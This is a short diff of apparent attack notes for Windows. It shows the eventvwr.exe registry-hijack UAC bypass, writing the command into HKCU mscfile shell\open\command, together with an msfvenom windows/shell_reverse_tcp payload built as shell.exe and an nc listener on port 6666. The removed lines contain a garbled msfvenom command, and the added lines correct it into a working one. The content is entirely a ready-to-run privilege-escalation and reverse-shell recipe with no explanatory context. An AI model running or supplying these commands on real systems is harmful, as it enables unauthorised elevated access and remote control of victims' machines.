@@ -1,12 +1,9 @@
-
-reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "rundll32.exe C:\users\public\shell.dll,0" /f
+reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "C:\users\public\shell.exe" /f
 eventvwr.exe
 
-msfvenom -pdows/shell_reverse_tcp LHOST=192.168.50.201 LPORT=6666 -f d-f -o s-o shell.dll
-nc -lvnp 6666
 
-
-
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.201 LPORT=6666 -f exe -o shell.exe
+nc -lvnp 6666 
 
 
 
